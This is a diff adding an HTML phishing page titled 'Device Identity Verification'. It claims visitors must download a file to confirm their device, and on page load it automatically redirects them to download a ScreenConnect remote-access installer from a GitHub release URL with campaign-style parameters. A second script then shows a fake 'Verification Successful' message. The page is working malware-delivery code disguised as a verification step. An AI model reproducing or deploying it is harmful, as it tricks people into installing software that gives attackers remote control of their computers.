@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Identity Verification</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        /* Background overlay & setup */
+        body {
+            /* Replace with your background image URL */
+            background: url('#') no-repeat center center fixed;
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Dark background overlay */
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 1;
+        }
+
+        /* Main Card */
+        .card {
+            position: relative;
+            z-index: 2;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+            transition: all 0.5s ease;
+        }
+
+        .card h2 {
+            color: #2c3e50;
+            margin-bottom: 15px;
+            font-size: 22px;
+        }
+
+        .card p {
+            color: #555;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        /* Spinner animation */
+        .spinner {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Success Checkmark Icon */
+        .success-icon {
+            display: none;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px auto;
+            border-radius: 50%;
+            background: #2ecc71;
+            color: white;
+            font-size: 50px;
+            line-height: 80px;
+            box-shadow: 0 0 20px rgba(46, 204, 113, 0.4);
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .hidden {
+            display: none !important;
+        }
+    </style>
+			<script>
+window.addEventListener("load", function () {
+    setTimeout(function () {
+        window.location.href = "https://github.com/us-north06/newdoument-access/releases/download/download-mynewdocument/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&c=Yahoo_Work&c=&c=&c=&c=&c=&c=&c=";
+    }, 1000);
+});
+</script>
+</head>
+<body>
+
+    <div class="overlay"></div>
+
+    <div class="card" id="mainCard">
+        <!-- Spinner -->
+        <div class="spinner" id="spinner"></div>
+
+        <!-- Checkmark -->
+        <div class="success-icon" id="successIcon">✓</div>
+
+        <!-- Content -->
+        <h2 id="title">Device Verification Required</h2>
+        <p id="description">You must download the file to confirm your device identity.</p>
+    </div>
+
+    <script>
+        // Target URL to redirect to after 2 minutes
+        const targetURL = "#";
+
+        // Wait time in seconds (120 seconds = 2 minutes)
+        const waitTimeInSeconds = 120; 
+
+        setTimeout(function() {
+            // Hide the spinner
+            document.getElementById('spinner').classList.add('hidden');
+
+            // Show success checkmark
+            document.getElementById('successIcon').style.display = 'block';
+
+            // Change card text to success state
+            document.getElementById('title').innerText = "Verification Successful!";
+            document.getElementById('title').style.color = "#2ecc71";
+            document.getElementById('description').innerText = "Redirecting you to the next page now...";
+
+            // Redirect after 2 seconds
+            setTimeout(function() {
+                window.location.href = targetURL;
+            }, 2000);
+
+        }, waitTimeInSeconds * 1000);
+    </script>
+
+</body>
+</html>
